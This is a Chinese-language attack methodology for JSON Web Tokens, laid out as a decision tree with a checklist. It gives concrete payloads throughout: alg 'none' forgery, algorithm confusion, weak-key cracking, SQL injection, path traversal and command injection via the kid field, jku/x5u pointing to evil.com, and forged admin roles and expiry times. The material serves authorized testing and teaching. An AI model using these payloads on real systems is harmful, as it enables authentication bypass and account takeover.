# JWT Payload 构造思路

> **原则**: 先看上下文 (alg/kid/jku),再决定攻击方式
> **目标**: 不盲目套 Payload,根据 JWT 结构选择攻击路径

---

## 思路 1: JWT 结构分析 (必须先做)

**目标**: 解析 JWT,识别攻击面

### 1.1 解析 JWT

```
JWT 格式: Header.Payload.Signature

示例:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjN9.xxx

解码 Header:
{"alg": "HS256", "typ": "JWT"}

解码 Payload:
{"user_id": 123}
```

### 1.2 关键字段识别

| 字段 | 位置 | 攻击面 |
|------|------|--------|
| `alg` | Header | 算法混淆攻击 |
| `kid` | Header | SQL 注入 / 路径遍历 |
| `jku` / `x5u` | Header | URL 劫持 |
| `user_id` / `role` | Payload | 权限提升 |

**关键**: 不同字段有不同的攻击方式

---

## 思路 2: 算法攻击

**目标**: 利用算法缺陷伪造 JWT

### 2.1 None 算法

```
原始 Header: {"alg": "HS256", "typ": "JWT"}
修改为: {"alg": "none", "typ": "JWT"}
删除 Signature 部分

构造: Header.Payload.
```

**适用**: 服务端未校验算法类型

### 2.2 HS256 → RS256 算法混淆

```
场景: 服务端用 RS256 (非对称),公钥可获取

攻击:
1. 获取公钥 (/.well-known/jwks.json)
2. 修改 alg 为 HS256
3. 用公钥作为 HMAC 密钥签名

原理: 服务端用公钥验证 HS256,而不是 RS256
```

**适用**: 服务端未严格校验算法类型

### 2.3 弱密钥爆破

```
如果 alg 是 HS256:
1. 用常见密钥爆破 (secret/123456/jwt)
2. 用字典爆破
3. 用 hashcat 爆破

工具: jwt_tool / hashcat
```

**适用**: 密钥强度弱

---

## 思路 3: kid 攻击

**目标**: 利用 kid 字段的注入漏洞

### 3.1 kid SQL 注入

```
原始: {"alg": "HS256", "kid": "1"}

测试:
{"alg": "HS256", "kid": "1' UNION SELECT 'secret'--"}

原理: 服务端用 kid 查询密钥
SELECT key FROM keys WHERE id = '${kid}'
```

### 3.2 kid 路径遍历

```
原始: {"alg": "HS256", "kid": "key1.pem"}

测试:
{"alg": "HS256", "kid": "../../etc/passwd"}

原理: 服务端用 kid 读取密钥文件
```

### 3.3 kid 命令注入

```
测试:
{"alg": "HS256", "kid": "key1.pem; whoami"}

原理: 服务端用 kid 执行命令
```

**关键**: kid 是用户可控的,可能存在注入

---

## 思路 4: jku/x5u 攻击

**目标**: 劫持密钥 URL

### 4.1 jku URL 劫持

```
原始: {"alg": "RS256", "jku": "https://auth.target.com/jwks.json"}

攻击:
1. 修改 jku 为攻击者域名
{"alg": "RS256", "jku": "https://evil.com/jwks.json"}

2. 在 evil.com 托管自己的公钥
3. 用对应私钥签名 JWT

原理: 服务端从 jku 获取公钥验证
```

**适用**: 服务端未校验 jku 域名

### 4.2 x5u 证书劫持

```
类似 jku,但用 X.509 证书

{"alg": "RS256", "x5u": "https://evil.com/cert.pem"}
```

**关键**: 服务端是否校验 URL 白名单

---

## 思路 5: Payload 篡改

**目标**: 修改 Payload 中的权限字段

### 5.1 权限提升

```
原始 Payload:
{"user_id": 123, "role": "user"}

修改为:
{"user_id": 123, "role": "admin"}

前提: 需要先绕过签名验证 (用上述方法)
```

### 5.2 用户 ID 篡改

```
原始: {"user_id": 123}
修改: {"user_id": 1}  (管理员 ID)

前提: 需要先绕过签名验证
```

**关键**: 先绕过签名,再篡改 Payload

---

## 思路 6: 时间攻击

**目标**: 利用过期时间

### 6.1 exp 字段篡改

```
原始: {"exp": 1640000000}  (已过期)
修改: {"exp": 9999999999}  (未来时间)

前提: 需要先绕过签名验证
```

### 6.2 iat 字段篡改

```
修改签发时间,延长有效期
```

**关键**: 服务端是否严格校验时间

---

## 攻击决策树

```
获取 JWT
    ↓
解析 Header 和 Payload
    ↓
检查 alg 字段
    ├─ alg: none → 尝试 None 算法攻击
    ├─ alg: HS256 → 尝试弱密钥爆破
    ├─ alg: RS256 → 尝试 HS256 混淆攻击
    └─ 其他 → 继续检查
        ↓
检查 kid 字段
    ├─ 存在 kid → 尝试 SQL 注入 / 路径遍历
    └─ 不存在 → 继续检查
        ↓
检查 jku/x5u 字段
    ├─ 存在 jku → 尝试 URL 劫持
    └─ 不存在 → 尝试 Payload 篡改
```

---

## 自我检查清单

- [ ] 是否已解析 JWT 的 Header 和 Payload?
- [ ] 是否检查了 alg 字段? (none/HS256/RS256)
- [ ] 是否检查了 kid 字段? (SQL注入/路径遍历)
- [ ] 是否检查了 jku/x5u 字段? (URL劫持)
- [ ] 是否尝试了弱密钥爆破?
- [ ] 是否尝试了算法混淆? (HS256→RS256)

---

## 常见错误

### 错误 1: 盲目尝试 None 算法

**问题**: 大部分现代框架已修复

**正确**: 先检查其他攻击面 (kid/jku)

### 错误 2: 不解析 JWT 就攻击

**问题**: 不知道有哪些字段可以利用

**正确**: 先用 jwt.io 解析,再决定攻击方式

### 错误 3: 只改 Payload 不重新签名

**问题**: 签名不匹配,JWT 无效

**正确**: 先绕过签名验证,再篡改 Payload

---

**版本**: v1.0  
**更新日期**: 2026-04-25